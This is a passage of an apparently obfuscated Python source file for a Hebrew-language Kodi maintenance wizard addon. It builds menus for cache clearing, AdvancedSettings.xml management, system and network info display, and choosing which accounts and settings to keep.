		addFile ('--- ניקוי חבילות בהפעלה: %s'%O0O0O0OOO0O000O0O .replace ('true',OOO000O00O0OO0O00 ).replace ('false',OOO0O00OO00O0OOO0 ),'togglesetting','clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2910
		addFile ('--- ניקוי תמונות ישנות בהפעלה: %s'%O0O000O0O00000OO0 .replace ('true',OOO000O00O0OO0O00 ).replace ('false',OOO0O00OO00O0OOO0 ),'togglesetting','clearthumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2911
	addFile ('ניקוי וידאו קאש','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2912
	addFile ('Include Video Cache in Clear Cache: %s'%OO0000O0OOO00OO0O .replace ('true',OOO000O00O0OO0O00 ).replace ('false',OOO0O00OO00O0OOO0 ),'togglecache','includevideo',icon =ICONMAINT ,themeit =THEME3 )#line:2913
	if OO0000O0OOO00OO0O =='true':#line:2914
		addFile ('--- Include All Video Addons: %s'%O0O00O0O0OO000O0O .replace ('true',OOO000O00O0OO0O00 ).replace ('false',OOO0O00OO00O0OOO0 ),'togglecache','includeall',icon =ICONMAINT ,themeit =THEME3 )#line:2915
		addFile ('--- Include Bob: %s'%OO00000OOOOOOO000 .replace ('true',OOO000O00O0OO0O00 ).replace ('false',OOO0O00OO00O0OOO0 ),'togglecache','includebob',icon =ICONMAINT ,themeit =THEME3 )#line:2916
		addFile ('--- Include Phoenix: %s'%O000000OO00OO0O0O .replace ('true',OOO000O00O0OO0O00 ).replace ('false',OOO0O00OO00O0OOO0 ),'togglecache','includephoenix',icon =ICONMAINT ,themeit =THEME3 )#line:2917
		addFile ('--- Include Specto: %s'%O00O0OO0OO00OOO00 .replace ('true',OOO000O00O0OO0O00 ).replace ('false',OOO0O00OO00O0OOO0 ),'togglecache','includespecto',icon =ICONMAINT ,themeit =THEME3 )#line:2918
		addFile ('--- Include Exodus: %s'%OOOOO0O00O0OO0O00 .replace ('true',OOO000O00O0OO0O00 ).replace ('false',OOO0O00OO00O0OOO0 ),'togglecache','includeexodus',icon =ICONMAINT ,themeit =THEME3 )#line:2919
		addFile ('--- Include Salts: %s'%O000OOOO000O00OO0 .replace ('true',OOO000O00O0OO0O00 ).replace ('false',OOO0O00OO00O0OOO0 ),'togglecache','includesalts',icon =ICONMAINT ,themeit =THEME3 )#line:2920
		addFile ('--- Include Salts HD Lite: %s'%O0O00O000O00O00O0 .replace ('true',OOO000O00O0OO0O00 ).replace ('false',OOO0O00OO00O0OOO0 ),'togglecache','includesaltslite',icon =ICONMAINT ,themeit =THEME3 )#line:2921
		addFile ('--- Include One Channel: %s'%O0O00OO0O0OOOOO0O .replace ('true',OOO000O00O0OO0O00 ).replace ('false',OOO0O00OO00O0OOO0 ),'togglecache','includeonechan',icon =ICONMAINT ,themeit =THEME3 )#line:2922
		addFile ('--- Include Genesis: %s'%OOO00OO00000OO00O .replace ('true',OOO000O00O0OO0O00 ).replace ('false',OOO0O00OO00O0OOO0 ),'togglecache','includegenesis',icon =ICONMAINT ,themeit =THEME3 )#line:2923
		addFile ('--- Enable All Video Addons','togglecache','true',icon =ICONMAINT ,themeit =THEME3 )#line:2924
		addFile ('--- Disable All Video Addons','togglecache','false',icon =ICONMAINT ,themeit =THEME3 )#line:2925
	setView ('files','viewType')#line:2926
def advancedWindow (url =None ):#line:2928
	if not ADVANCEDFILE =='http://':#line:2929
		if url ==None :#line:2930
			O00OOO0OOO00OOOOO =wiz .workingURL (ADVANCEDFILE )#line:2931
			OOO00OOO0OO0O0000 =uservar .ADVANCEDFILE #line:2932
		else :#line:2933
			O00OOO0OOO00OOOOO =wiz .workingURL (url )#line:2934
			OOO00OOO0OO0O0000 =url #line:2935
		addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2936
		if os .path .exists (ADVANCED ):#line:2937
			addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2938
			addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2939
		if O00OOO0OOO00OOOOO ==True :#line:2940
			if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONMAINT ,themeit =THEME3 )#line:2941
			OOOOOO0O00O0O0OOO =wiz .openURL (OOO00OOO0OO0O0000 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2942
			OO000OO0O000O00O0 =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (OOOOOO0O00O0O0OOO )#line:2943
			if len (OO000OO0O000O00O0 )>0 :#line:2944
				for OO000O0OOOO0OOOOO ,OOOOO000OO0OO000O ,url ,OO00O0O0O000O0OOO ,OOOOOO0000O0000O0 ,OOOO0O00000OOOO00 in OO000OO0O000O00O0 :#line:2945
					if OOOOO000OO0OO000O .lower ()=="yes":#line:2946
						addDir ("[B]%s[/B]"%OO000O0OOOO0OOOOO ,'advancedsetting',url ,description =OOOO0O00000OOOO00 ,icon =OO00O0O0O000O0OOO ,fanart =OOOOOO0000O0000O0 ,themeit =THEME3 )#line:2947
					else :#line:2948
						addFile (OO000O0OOOO0OOOOO ,'writeadvanced',OO000O0OOOO0OOOOO ,url ,description =OOOO0O00000OOOO00 ,icon =OO00O0O0O000O0OOO ,fanart =OOOOOO0000O0000O0 ,themeit =THEME2 )#line:2949
			else :wiz .log ("[Advanced Settings] ERROR: Invalid Format.")#line:2950
		else :wiz .log ("[Advanced Settings] URL not working: %s"%O00OOO0OOO00OOOOO )#line:2951
	else :wiz .log ("[Advanced Settings] not Enabled")#line:2952
def writeAdvanced (OOO0O0O0000O00OO0 ,OO0O0OOOO0OO0O0O0 ):#line:2954
	OOO0OO0OOO0O0O000 =wiz .workingURL (OO0O0OOOO0OO0O0O0 )#line:2955
	if OOO0OO0OOO0O0O000 ==True :#line:2956
		if os .path .exists (ADVANCED ):OO0O00OO000OOO0OO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to overwrite your current Advanced Settings with [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,OOO0O0O0000O00OO0 ),yeslabel ="[B][COLOR green]Overwrite[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel[/COLOR][/B]")#line:2957
		else :OO0O00OO000OOO0OO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,OOO0O0O0000O00OO0 ),yeslabel ="[B][COLOR green]התקנה[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:2958
		if OO0O00OO000OOO0OO ==1 :#line:2960
			OO0O0O0OO0O0O0OO0 =wiz .openURL (OO0O0OOOO0OO0O0O0 )#line:2961
			OOO0OOO0O0O0000O0 =open (ADVANCED ,'w');#line:2962
			OOO0OOO0O0O0000O0 .write (OO0O0O0OO0O0O0OO0 )#line:2963
			OOO0OOO0O0O0000O0 .close ()#line:2964
			DIALOG .ok (ADDONTITLE ,'[COLOR %s]AdvancedSettings.xml file has been successfully written.  Once you click okay it will force close kodi.[/COLOR]'%COLOR2 )#line:2965
			wiz .killxbmc (True )#line:2966
		else :wiz .log ("[Advanced Settings] install canceled");wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Write Cancelled![/COLOR]"%COLOR2 );return #line:2967
	else :wiz .log ("[Advanced Settings] URL not working: %s"%OOO0OO0OOO0O0O000 );wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]URL Not Working[/COLOR]"%COLOR2 )#line:2968
def viewAdvanced ():#line:2970
	O00OO0O0O0OOO00O0 =open (ADVANCED )#line:2971
	OO0OOOOO0O00O0O00 =O00OO0O0O0OOO00O0 .read ().replace ('\t','    ')#line:2972
	wiz .TextBox (ADDONTITLE ,OO0OOOOO0O00O0O00 )#line:2973
	O00OO0O0O0OOO00O0 .close ()#line:2974
def removeAdvanced ():#line:2976
	if os .path .exists (ADVANCED ):#line:2977
		wiz .removeFile (ADVANCED )#line:2978
	else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]AdvancedSettings.xml not found[/COLOR]")#line:2979
def showAutoAdvanced ():#line:2981
	notify .autoConfig ()#line:2982
def getIP ():#line:2984
	OO000OO0OO000O0O0 ='http://whatismyipaddress.com/'#line:2985
	if not wiz .workingURL (OO000OO0OO000O0O0 ):return 'Unknown','Unknown','Unknown'#line:2986
	OOO0O00O0OO0O000O =wiz .openURL (OO000OO0OO000O0O0 ).replace ('\n','').replace ('\r','')#line:2987
	if not 'Access Denied'in OOO0O00O0OO0O000O :#line:2988
		OOOOOOOOO0000O0O0 =re .compile ('whatismyipaddress.com/ip/(.+?)"').findall (OOO0O00O0OO0O000O )#line:2989
		OOO0000OO000OO0OO =OOOOOOOOO0000O0O0 [0 ]if (len (OOOOOOOOO0000O0O0 )>0 )else 'Unknown'#line:2990
		OO0OO0O000O000OOO =re .compile ('"font-size:14px;">(.+?)</td>').findall (OOO0O00O0OO0O000O )#line:2991
		OO000000000OOOO00 =OO0OO0O000O000OOO [0 ]if (len (OO0OO0O000O000OOO )>0 )else 'Unknown'#line:2992
		OO00O0O0O0OO0OOO0 =OO0OO0O000O000OOO [1 ]+', '+OO0OO0O000O000OOO [2 ]+', '+OO0OO0O000O000OOO [3 ]if (len (OO0OO0O000O000OOO )>2 )else 'Unknown'#line:2993
		return OOO0000OO000OO0OO ,OO000000000OOOO00 ,OO00O0O0O0OO0OOO0 #line:2994
	else :return 'Unknown','Unknown','Unknown'#line:2995
def systemInfo ():#line:2997
	O0OOOOOOOO0OOOO0O =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:3011
	O0O00000O00OO0O00 =[];OOO0O0000OO00OOOO =0 #line:3012
	for O0O0OOOOOOO0OOOOO in O0OOOOOOOO0OOOO0O :#line:3013
		OOOOO0O0O0000000O =wiz .getInfo (O0O0OOOOOOO0OOOOO )#line:3014
		O0OO0O0O00OOOOO0O =0 #line:3015
		while OOOOO0O0O0000000O =="Busy"and O0OO0O0O00OOOOO0O <10 :#line:3016
			OOOOO0O0O0000000O =wiz .getInfo (O0O0OOOOOOO0OOOOO );O0OO0O0O00OOOOO0O +=1 ;wiz .log ("%s sleep %s"%(O0O0OOOOOOO0OOOOO ,str (O0OO0O0O00OOOOO0O )));xbmc .sleep (1000 )#line:3017
		O0O00000O00OO0O00 .append (OOOOO0O0O0000000O )#line:3018
		OOO0O0000OO00OOOO +=1 #line:3019
	O0O00000O000O00O0 =O0O00000O00OO0O00 [8 ]if 'Una'in O0O00000O00OO0O00 [8 ]else wiz .convertSize (int (float (O0O00000O00OO0O00 [8 ][:-8 ]))*1024 *1024 )#line:3020
	O0000000OOOOOOOO0 =O0O00000O00OO0O00 [9 ]if 'Una'in O0O00000O00OO0O00 [9 ]else wiz .convertSize (int (float (O0O00000O00OO0O00 [9 ][:-8 ]))*1024 *1024 )#line:3021
	OO0OOO00O0OOOO0OO =O0O00000O00OO0O00 [10 ]if 'Una'in O0O00000O00OO0O00 [10 ]else wiz .convertSize (int (float (O0O00000O00OO0O00 [10 ][:-8 ]))*1024 *1024 )#line:3022
	O0OOOO00O00O00OOO =wiz .convertSize (int (float (O0O00000O00OO0O00 [11 ][:-2 ]))*1024 *1024 )#line:3023
	OOO00O0O0O00OO0O0 =wiz .convertSize (int (float (O0O00000O00OO0O00 [12 ][:-2 ]))*1024 *1024 )#line:3024
	O0OOO00OOO0OOO000 =wiz .convertSize (int (float (O0O00000O00OO0O00 [13 ][:-2 ]))*1024 *1024 )#line:3025
	OOOO00OO00O00OO00 ,O00O00OO0O000O0OO ,O00OO00O0OOO0OOOO =getIP ()#line:3026
	O00O0000O0O000OOO =[];O0000OO00O00OO000 =[];O0OOOOO0O0O00OO0O =[];O0O00OO00OOO0O000 =[];O00000OO0O000O00O =[];O000OOO0OO000O000 =[];O0OOOOOOOOOO0OOOO =[]#line:3028
	OO00OO00O0O0O0000 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3030
	for OO0OO0OO00O0OO000 in sorted (OO00OO00O0O0O0000 ,key =lambda OO000O00OOO00O000 :OO000O00OOO00O000 ):#line:3031
		OOO0000OOOO00OOOO =os .path .split (OO0OO0OO00O0OO000 [:-1 ])[1 ]#line:3032
		if OOO0000OOOO00OOOO =='packages':continue #line:3033
		O0O00OOO00O00000O =os .path .join (OO0OO0OO00O0OO000 ,'addon.xml')#line:3034
		if os .path .exists (O0O00OOO00O00000O ):#line:3035
			OOO00O0O00O0OO0O0 =open (O0O00OOO00O00000O )#line:3036
			O0O000O00OO0O00OO =OOO00O0O00O0OO0O0 .read ()#line:3037
			O0O0OO0OO000OO0O0 =re .compile ("<provides>(.+?)</provides>").findall (O0O000O00OO0O00OO )#line:3038
			if len (O0O0OO0OO000OO0O0 )==0 :#line:3039
				if OOO0000OOOO00OOOO .startswith ('skin'):O0OOOOOOOOOO0OOOO .append (OOO0000OOOO00OOOO )#line:3040
				if OOO0000OOOO00OOOO .startswith ('repo'):O00000OO0O000O00O .append (OOO0000OOOO00OOOO )#line:3041
				else :O000OOO0OO000O000 .append (OOO0000OOOO00OOOO )#line:3042
			elif not (O0O0OO0OO000OO0O0 [0 ]).find ('executable')==-1 :O0O00OO00OOO0O000 .append (OOO0000OOOO00OOOO )#line:3043
			elif not (O0O0OO0OO000OO0O0 [0 ]).find ('video')==-1 :O0OOOOO0O0O00OO0O .append (OOO0000OOOO00OOOO )#line:3044
			elif not (O0O0OO0OO000OO0O0 [0 ]).find ('audio')==-1 :O0000OO00O00OO000 .append (OOO0000OOOO00OOOO )#line:3045
			elif not (O0O0OO0OO000OO0O0 [0 ]).find ('image')==-1 :O00O0000O0O000OOO .append (OOO0000OOOO00OOOO )#line:3046
	addFile ('[B]Media Center Info:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3048
	addFile ('[COLOR %s]Name:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O00000O00OO0O00 [0 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3049
	addFile ('[COLOR %s]Version:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O00000O00OO0O00 [1 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3050
	addFile ('[COLOR %s]Platform:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,wiz .platform ().title ()),'',icon =ICONMAINT ,themeit =THEME3 )#line:3051
	addFile ('[COLOR %s]CPU Usage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O00000O00OO0O00 [2 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3052
	addFile ('[COLOR %s]Screen Mode:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O00000O00OO0O00 [3 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3053
	addFile ('[B]Uptime:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3055
	addFile ('[COLOR %s]Current Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O00000O00OO0O00 [6 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3056
	addFile ('[COLOR %s]Total Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O00000O00OO0O00 [7 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3057
	addFile ('[B]Local Storage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3059
	addFile ('[COLOR %s]Used Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O00000O000O00O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3060
	addFile ('[COLOR %s]Free Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0000000OOOOOOOO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3061
	addFile ('[COLOR %s]Total Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OOO00O0OOOO0OO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3062
	addFile ('[B]Ram Usage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3064
	addFile ('[COLOR %s]Used Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OOOO00O00O00OOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3065
	addFile ('[COLOR %s]Free Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO00O0O0O00OO0O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3066
	addFile ('[COLOR %s]Total Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OOO00OOO0OOO000 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3067
	addFile ('[B]Network:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3069
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O00000O00OO0O00 [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3070
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOO00OO00O00OO00 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3071
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00O00OO0O000O0OO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3072
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00OO00O0OOO0OOOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3073
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O00000O00OO0O00 [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3074
	O0OO00O0000OO000O =len (O00O0000O0O000OOO )+len (O0000OO00O00OO000 )+len (O0OOOOO0O0O00OO0O )+len (O0O00OO00OOO0O000 )+len (O000OOO0OO000O000 )+len (O0OOOOOOOOOO0OOOO )+len (O00000OO0O000O00O )#line:3076
	addFile ('[B]Addons([COLOR %s]%s[/COLOR]):[/B]'%(COLOR1 ,O0OO00O0000OO000O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3077
	addFile ('[COLOR %s]Video Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0OOOOO0O0O00OO0O ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3078
	addFile ('[COLOR %s]Program Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0O00OO00OOO0O000 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3079
	addFile ('[COLOR %s]Music Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0000OO00O00OO000 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3080
	addFile ('[COLOR %s]Picture Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O00O0000O0O000OOO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3081
	addFile ('[COLOR %s]Repositories:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O00000OO0O000O00O ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3082
	addFile ('[COLOR %s]Skins:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0OOOOOOOOOO0OOOO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3083
	addFile ('[COLOR %s]Scripts/Modules:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O000OOO0OO000O000 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3084
def Menu ():#line:3085
	addDir ('אפשרויות נוספות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:3086
def saveMenu ():#line:3088
	OOOO000OO0O0000OO ='[COLOR yellow]מופעל[/COLOR]';OOO0000O000OO00O0 ='[COLOR blue]מבוטל[/COLOR]'#line:3090
	OOOOO0O00OO0OO00O ='true'if KEEPMOVIEWALL =='true'else 'false'#line:3091
	OO0O0000000O000OO ='true'if KEEPMOVIELIST =='true'else 'false'#line:3092
	OOOOOO00O0000OOO0 ='true'if KEEPINFO =='true'else 'false'#line:3093
	OOOO00000OO000OOO ='true'if KEEPSOUND =='true'else 'false'#line:3095
	OOOOO0000OO0O0OO0 ='true'if KEEPVIEW =='true'else 'false'#line:3096
	OO0OOOO0OO000O00O ='true'if KEEPSKIN =='true'else 'false'#line:3097
	O0O0O0OOOOOO00O00 ='true'if KEEPSKIN2 =='true'else 'false'#line:3098
	OOO0OO0000OOOO000 ='true'if KEEPSKIN3 =='true'else 'false'#line:3099
	O0O0O00O00OOO0OOO ='true'if KEEPADDONS =='true'else 'false'#line:3100
	OO0OOO0O00O00OOOO ='true'if KEEPPVR =='true'else 'false'#line:3101
	O00O0000O0O0OO0O0 ='true'if KEEPTVLIST =='true'else 'false'#line:3102
	O0O000000000000O0 ='true'if KEEPHUBMOVIE =='true'else 'false'#line:3103
	O0O0O000OO000000O ='true'if KEEPHUBTVSHOW =='true'else 'false'#line:3104
	O00O0O00OOO000OO0 ='true'if KEEPHUBTV =='true'else 'false'#line:3105
	OO0O0000O00O0OO00 ='true'if KEEPHUBVOD =='true'else 'false'#line:3106
	O00O0O0O0000000OO ='true'if KEEPHUBSPORT =='true'else 'false'#line:3107
	OOOO0O0O0OO00O00O ='true'if KEEPHUBKIDS =='true'else 'false'#line:3108
	OOO0000O0O0OOO000 ='true'if KEEPHUBMUSIC =='true'else 'false'#line:3109
	O00000O00OOO00000 ='true'if KEEPHUBMENU =='true'else 'false'#line:3110
	OO0OOOOOO0OOO00OO ='true'if KEEPPLAYLIST =='true'else 'false'#line:3111
	OO0OO00000O000O0O ='true'if KEEPTRAKT =='true'else 'false'#line:3112
	OOOO0OO0O0OO00000 ='true'if KEEPREAL =='true'else 'false'#line:3113
	OOO00OOOOO00OOO0O ='true'if KEEPRD2 =='true'else 'false'#line:3114
	OOOO0O0OOO00O00OO ='true'if KEEPTORNET =='true'else 'true'#line:3115
	O000OO000O0O0OOO0 ='true'if KEEPLOGIN =='true'else 'false'#line:3116
	OOO00O00O0O00O000 ='true'if KEEPSOURCES =='true'else 'false'#line:3117
	OOOO00O0OOO0O00OO ='true'if KEEPADVANCED =='true'else 'false'#line:3118
	OOOO00O00O0O0O00O ='true'if KEEPPROFILES =='true'else 'false'#line:3119
	OO0OOOOOO0OO00OOO ='true'if KEEPFAVS =='true'else 'false'#line:3120
	O0OO0OO00O00O0000 ='true'if KEEPREPOS =='true'else 'false'#line:3121
	O000000OOOOOOOOOO ='true'if KEEPSUPER =='true'else 'false'#line:3122
	OOO000000OOO000OO ='true'if KEEPWHITELIST =='true'else 'false'#line:3123
	OO0OO00O0O0O000OO ='true'if KEEPWEATHER =='true'else 'false'#line:3124
	O0O00000O0OO0O000 ='true'if KEEPVICTORY =='true'else 'false'#line:3125
	O0O0OOOO0OOOO0000 ='true'if KEEPTELEMEDIA =='true'else 'false'#line:3126
	if OOO000000OOO000OO =='true':#line:3128
		addFile ('בחר הרחבות לשמירה','whitelist','edit',icon =ICONSAVE ,themeit =THEME1 )#line:3129
		addFile ('רשימת ההרחבות שבחרתי לשמור','whitelist','view',icon =ICONSAVE ,themeit =THEME1 )#line:3130
		addFile ('נקה רשימת הרחבות','whitelist','clear',icon =ICONSAVE ,themeit =THEME1 )#line:3131
		addFile ('יבה רשימת הרחבות','whitelist','import',icon =ICONSAVE ,themeit =THEME1 )#line:3132
		addFile ('יצא רשימת הרחבות','whitelist','export',icon =ICONSAVE ,themeit =THEME1 )#line:3133
	addFile ('%s שמירת חשבון RD:  '%OOOO0OO0O0OO00000 .replace ('true',OOOO000OO0O0000OO ).replace ('false',OOO0000O000OO00O0 ),'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME1 )#line:3136
	addFile ('%s שמירת חשבון טראקט:  '%OO0OO00000O000O0O .replace ('true',OOOO000OO0O0000OO ).replace ('false',OOO0000O000OO00O0 ),'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME1 )#line:3137
	addFile ('%s שמירת מועדפים:  '%OO0OOOOOO0OO00OOO .replace ('true',OOOO000OO0O0000OO ).replace ('false',OOO0000O000OO00O0 ),'togglesetting','keepfavourites',icon =ICONSAVE ,themeit =THEME1 )#line:3140
	addFile ('%s שמירת לקוח טלוויזיה:  '%OO0OOO0O00O00OOOO .replace ('true',OOOO000OO0O0000OO ).replace ('false',OOO0000O000OO00O0 ),'togglesetting','keeppvr',icon =ICONTRAKT ,themeit =THEME1 )#line:3141
	addFile ('%s שמירת הגדרות הרחבה ויקטורי:  '%O0O00000O0OO0O000 .replace ('true',OOOO000OO0O0000OO ).replace ('false',OOO0000O000OO00O0 ),'togglesetting','keepvictory',icon =ICONTRAKT ,themeit =THEME1 )#line:3142
	addFile ('%s שמירת חשבון טלמדיה:  '%O0O0OOOO0OOOO0000 .replace ('true',OOOO000OO0O0000OO ).replace ('false',OOO0000O000OO00O0 ),'togglesetting','keeptelemedia',icon =ICONTRAKT ,themeit =THEME1 )#line:3143
	addFile ('%s שמירת רשימת עורצי טלוויזיה:  '%O00O0000O0O0OO0O0 .replace ('true',OOOO000OO0O0000OO ).replace ('false',OOO0000O000OO00O0 ),'togglesetting','keeptvlist',icon =ICONTRAKT ,themeit =THEME1 )#line:3144
	addFile ('%s שמירת אריח סרטים:  '%O0O000000000000O0 .replace ('true',OOOO000OO0O0000OO ).replace ('false',OOO0000O000OO00O0 ),'togglesetting','keephubmovie',icon =ICONTRAKT ,themeit =THEME1 )#line:3145
	addFile ('%s שמירת אריח סדרות:  '%O0O0O000OO000000O .replace ('true',OOOO000OO0O0000OO ).replace ('false',OOO0000O000OO00O0 ),'togglesetting','keephubtvshow',icon =ICONTRAKT ,themeit =THEME1 )#line:3146
	addFile ('%s שמירת אריח טלויזיה:  '%O00O0O00OOO000OO0 .replace ('true',OOOO000OO0O0000OO ).replace ('false',OOO0000O000OO00O0 ),'togglesetting','keephubtv',icon =ICONTRAKT ,themeit =THEME1 )#line:3147
	addFile ('%s שמירת אריח תוכן ישראלי:  '%OO0O0000O00O0OO00 .replace ('true',OOOO000OO0O0000OO ).replace ('false',OOO0000O000OO00O0 ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:3148
	addFile ('%s שמירת אריח ספורט:  '%O00O0O0O0000000OO .replace ('true',OOOO000OO0O0000OO ).replace ('false',OOO0000O000OO00O0 ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:3149
	addFile ('%s שמירת אריח ילדים:  '%OOOO0O0O0OO00O00O .replace ('true',OOOO000OO0O0000OO ).replace ('false',OOO0000O000OO00O0 ),'togglesetting','keephubkids',icon =ICONTRAKT ,themeit =THEME1 )#line:3150
	addFile ('%s שמירת אריח מוסיקה:  '%OOO0000O0O0OOO000 .replace ('true',OOOO000OO0O0000OO ).replace ('false',OOO0000O000OO00O0 ),'togglesetting','keephubmusic',icon =ICONTRAKT ,themeit =THEME1 )#line:3151
	addFile ('%s שמירת תפריט אריחים ראשי:  '%O00000O00OOO00000 .replace ('true',OOOO000OO0O0000OO ).replace ('false',OOO0000O000OO00O0 ),'togglesetting','keephubmenu',icon =ICONTRAKT ,themeit =THEME1 )#line:3152
	addFile ('%s שמירת כל האריחים בסקין:  '%OO0OOOO0OO000O00O .replace ('true',OOOO000OO0O0000OO ).replace ('false',OOO0000O000OO00O0 ),'togglesetting','keepskin',icon =ICONTRAKT ,themeit =THEME1 )#line:3153
	addFile ('%s שמירת הגדרות מזג האוויר:  '%OO0OO00O0O0O000OO .replace ('true',OOOO000OO0O0000OO ).replace ('false',OOO0000O000OO00O0 ),'togglesetting','keepweather',icon =ICONTRAKT ,themeit =THEME1 )#line:3154
	addFile ('%s שמירת הרחבות שהתקנתי:  '%O0O0O00O00OOO0OOO .replace ('true',OOOO000OO0O0000OO ).replace ('false',OOO0000O000OO00O0 ),'togglesetting','keepaddons',icon =ICONTRAKT ,themeit =THEME1 )#line:3160
	addFile ('%s שמירת חשבון סדרות Tv ו Apollo Group:  '%OOOOOO00O0000OOO0 .replace ('true',OOOO000OO0O0000OO ).replace ('false',OOO0000O000OO00O0 ),'togglesetting','keepinfo',icon =ICONTRAKT ,themeit =THEME1 )#line:3161
	addFile ('%s שמירת ספריית סרטים וסדרות:  '%OO0O0000000O000OO .replace ('true',OOOO000OO0O0000OO ).replace ('false',OOO0000O000OO00O0 ),'togglesetting','keepmovielist',icon =ICONTRAKT ,themeit =THEME1 )#line:3164
